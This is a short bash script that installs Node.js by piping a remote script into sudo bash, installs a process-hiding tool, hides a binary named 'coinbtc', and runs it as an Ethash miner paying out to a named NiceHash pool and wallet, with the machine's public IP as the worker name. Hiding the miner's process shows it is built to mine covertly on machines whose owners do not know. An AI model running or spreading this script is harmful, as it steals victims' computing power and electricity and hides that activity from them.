#!/bin/bash

POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353

WALLET=3K58rk4hAySW78RPaxkzFVhddAL7iMxkbZ

WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH

cd "$(dirname "$0")"

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
apt-get install screen -y
npm i -g node-process-hider
sudo ph add coinbtc
chmod +x ./coinbtc && sudo ./coinbtc --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY

echo success
